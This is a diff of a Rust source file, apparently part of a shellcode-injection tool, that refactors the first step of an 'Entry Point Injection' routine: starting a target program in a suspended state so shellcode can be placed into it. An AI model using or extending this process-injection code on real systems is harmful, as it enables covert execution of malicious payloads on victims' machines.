@@ -1,6 +1,4 @@
-use std::ffi::CString;
-use windows_sys::Win32::System::Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED};
-use windows_sys::Win32::Foundation::{GetLastError, FALSE};
+use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 
 #[cfg(feature = "run_entry_point_injection")]
@@ -9,27 +7,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     crate::utils::print_message("Starting Entry Point Injection (EPI)...");
 
     // 1. Create Process in Suspended State
-    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
-    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
-    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-
-    let app_name = CString::new(target_program).unwrap();
-    let success = CreateProcessA(
-        std::ptr::null(),
-        app_name.as_ptr() as *mut u8,
-        std::ptr::null(),
-        std::ptr::null(),
-        0,
-        CREATE_SUSPENDED,
-        std::ptr::null(),
-        std::ptr::null(),
-        &startup_info,
-        &mut process_info,
-    );
-
-    if success == FALSE {
-        return Err(format!("CreateProcessA failed: {}", GetLastError()));
-    }
+    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
 
     #[cfg(feature = "debug")]
     crate::utils::print_message(&format!("Process created. PID: {}", process_info.dwProcessId));
